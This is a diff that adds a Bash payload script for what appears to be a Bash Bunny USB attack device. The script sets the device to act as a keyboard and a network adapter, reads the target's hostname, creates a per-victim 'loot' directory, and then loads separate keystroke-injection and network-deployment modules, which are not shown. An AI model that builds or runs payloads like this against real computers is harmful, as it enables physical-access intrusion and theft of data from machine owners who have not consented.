@@ -1,0 +1,33 @@
+#!/bin/bash
+
+
+#### INITIALIZE STAGE ####
+LED SETUP
+
+# DO NOT USE, WILL BE IMPLEMENTED IN FUTURE UPDATE
+# export SERVER_PORT=1337
+
+#### SET HID AND NETWORK ATTACKMODE ####
+ATTACKMODE HID RNDIS_ETHERNET RNDIS_SPEED_10000
+# sleep 5
+
+# Get target machine name and make loot folder for it.
+while [ -z $TARGET_HOSTNAME ]; do
+	GET TARGET_HOSTNAME;
+	sleep 1;
+done
+
+# Set Loot dir to machine name off of root loot dir for BBTPS
+export LOOTDIR="$ROOTLOOTDIR/$TARGET_HOSTNAME"
+if [ ! -d $LOOTDIR ]; then
+    mkdir $LOOTDIR;
+fi
+
+GET HOST_IP
+export SERVERIP=$HOST_IP
+
+# HID Script
+source $PAYLOADFOLDER/payloadmods/qinitial.txt
+
+#Network Initialization and deploy
+source $PAYLOADFOLDER/payloadmods/netinitial.txt
